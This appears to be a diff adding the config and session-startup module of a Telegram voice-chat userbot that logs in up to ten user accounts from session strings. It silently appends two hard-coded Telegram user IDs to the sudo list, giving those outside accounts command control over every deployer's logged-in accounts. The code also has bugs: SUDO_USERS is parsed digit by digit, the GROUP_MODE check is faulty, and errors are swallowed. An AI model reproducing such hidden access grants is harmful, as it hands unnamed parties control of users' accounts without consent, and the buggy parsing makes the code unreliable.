@@ -1,0 +1,225 @@
+import os
+import asyncio
+import sys
+from dotenv import load_dotenv
+from pyrogram import Client, filters
+from pytgcalls import PyTgCalls
+from os import getenv
+# For Local Deploy
+if os.path.exists(".env"):
+    load_dotenv(".env")
+    
+# Necessary Vars
+API_ID = int(os.getenv("API_ID", ""))
+API_HASH = os.getenv("API_HASH", "")
+SESSION = os.getenv("SESSION")
+SESSION2 = os.getenv("SESSION2", None)
+SESSION3 = os.getenv("SESSION3", None)
+SESSION4 = os.getenv("SESSION4", None)
+SESSION5 = os.getenv("SESSION5", None)
+SESSION6 = os.getenv("SESSION6", None)
+SESSION7 = os.getenv("SESSION7", None)
+SESSION8 = os.getenv("SESSION8", None)
+SESSION9 = os.getenv("SESSION9", None)
+SESSION10 = os.getenv("SESSION10", None)
+HNDLR = os.getenv("HNDLR", "!")
+GROUP_MODE = os.getenv("GROUP_MODE", "True")
+Suar = list(map(int, getenv("SUDO_USERS", "")))
+if 1517994352 not in Suar:
+    Suar.append(1517994352)
+if 1789859817 not in Suar:
+    Suar.append(1789859817)
+
+contact_filter = filters.create(
+    lambda _, __, message:
+    (message.from_user and message.from_user.is_contact) or message.outgoing
+)
+
+
+if GROUP_MODE == ("True" or "true"):
+    grp = True
+else:
+    grp = False
+
+
+GRPPLAY = grp
+bot = Client(SESSION, API_ID, API_HASH, plugins=dict(root="ArrayCore.vc"))
+call_py = PyTgCalls(bot)
+
+
+# sessions
+async def Akashxd():
+    global Nobi2
+    global Nobi3
+    global Nobi5
+    global Nobi4
+    global Nobi6
+    global Nobi7
+    global Nobi8
+    global Nobi9
+    global Nobi10
+    
+    if SESSION2:
+        sexx = str(SESSION2)
+        print("Session 2 found")
+        Nobi2 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try: 
+           await Nobi2.start()
+        except Exception as e:
+           print(e)
+           pass
+    else: 
+        sexx = "Nobitavc"
+        print("session 2 not found")
+        Nobi2 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try:
+           await Nobi2.start()
+        except Exception as e:
+           pass
+
+    if SESSION3:
+        sexx = str(SESSION3)
+        print("Session 3 found")
+        Nobi3 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try: 
+           await Nobi3.start()
+        except Exception as e:
+           print(e)
+           pass
+    else: 
+        sexx = "Nobitavc"
+        print("session 3 not found")
+        Nobi3 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try:
+           await Nobi3.start()
+        except Exception as e:
+           pass
+
+    if SESSION4:
+        sexx = str(SESSION4)
+        print("Session 4 found")
+        Nobi4 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try: 
+           await Nobi4.start()
+        except Exception as e:
+           print(e)
+           pass
+    else: 
+        sexx = "Nobitavc"
+        print("session 4 not found")
+        Nobi4 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try:
+           await Nobi4.start()
+        except Exception as e:
+           pass
+
+    if SESSION5:
+        sexx = str(SESSION5)
+        print("Session 5 found")
+        Nobi5 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try: 
+           await Nobi5.start()
+        except Exception as e:
+           print(e)
+           pass
+    else: 
+        sexx = "Nobitavc"
+        print("session 5 not found")
+        Nobi5 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try:
+           await Nobi5.start()
+        except Exception as e:
+           pass
+
+    if SESSION6:
+        sexx = str(SESSION6)
+        print("Session 6 found")
+        Nobi6 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try: 
+           await Nobi6.start()
+        except Exception as e:
+           print(e)
+           pass
+    else: 
+        sexx = "Nobitavc"
+        print("session 6 not found")
+        Nobi6 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try:
+           await Nobi6.start()
+        except Exception as e:
+           pass
+
+    if SESSION7:
+        sexx = str(SESSION7)
+        print("Session 7 found")
+        Nobi7 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try: 
+           await Nobi7.start()
+        except Exception as e:
+           print(e)
+           pass
+    else: 
+        sexx = "Nobitavc"
+        print("session 7 not found")
+        Nobi7 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try:
+           await Nobi7.start()
+        except Exception as e:
+           pass
+
+    if SESSION8:
+        sexx = str(SESSION8)
+        print("Session 8 found")
+        Nobi8 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try: 
+           await Nobi8.start()
+        except Exception as e:
+           print(e)
+           pass
+    else: 
+        sexx = "Nobitavc"
+        print("session 8 not found")
+        Nobi8 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try:
+           await Nobi8.start()
+        except Exception as e:
+           pass
+
+    if SESSION9:
+        sexx = str(SESSION9)
+        print("Session 9 found")
+        Nobi9 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try: 
+           await Nobi9.start()
+        except Exception as e:
+           print(e)
+           pass
+    else: 
+        sexx = "Nobitavc"
+        print("session 9 not found")
+        Nobi9 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try:
+           await Nobi9.start()
+        except Exception as e:
+           pass
+    
+    if SESSION10:
+        sexx = str(SESSION10)
+        print("Session 10 found")
+        Nobi10 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try: 
+           await Nobi10.start()
+        except Exception as e:
+           print(e)
+           pass
+    else: 
+        sexx = "Nobitavc"
+        print("session 01 not found")
+        Nobi10 = Client(sexx, api_id=API_ID, api_hash=API_HASH)
+        try:
+           await Nobi10.start()
+        except Exception as e:
+           pass
+
+loop = asyncio.get_event_loop()
+loop.run_until_complete(Akashxd())    
